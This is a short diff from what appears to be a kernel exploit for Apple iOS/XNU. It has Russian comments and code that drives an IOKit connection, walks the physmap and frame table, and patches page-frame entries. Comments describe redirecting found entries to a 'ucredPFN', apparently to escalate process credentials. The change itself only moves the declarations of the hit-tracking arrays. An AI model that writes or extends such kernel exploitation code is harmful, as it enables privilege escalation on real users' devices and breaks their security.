@@ -6261,6 +6261,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // таблиц обходится без единой записи в таблицу с нашей стороны. Первая
     // запись пробная (пауза+лог): если physmap-запись в 0x21 тоже охраняется,
     // паника назовёт адрес (x1), остальное не тронуто.
+    uint64_t hitAddr[24], hitOld[24]; int hitForm[24];   // DEP-хиты уровня функции — форж перепатчит на ucredPFN (1.9.208)
+    int nDep = 0;
     if (pfn32 && ctlPFN) {
         uint64_t ftVA2 = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
         uint64_t totalPages2 = kconstant(physSize) >> 14;
@@ -6304,8 +6306,6 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         }
     }
     // 1.9.198: VA-FIELD DEPUTY — 1.9.197 доказал: prepare считает PA = vtophys
-    uint64_t hitAddr[24], hitOld[24]; int hitForm[24];   // DEP-хиты уровня функции — форж перепатчит на ucredPFN (1.9.208)
-    int nDep = 0;
     // (kernel VA буфера) на лету (слот откатился в ОРИГИНАЛ при пропатченных
     // pfn-хранилищах — источник = трансляция, не хранилище). Патчим само
     // VA-поле: ищем в plane-desc/rangeObj/surf указатель P с [P] == маркер
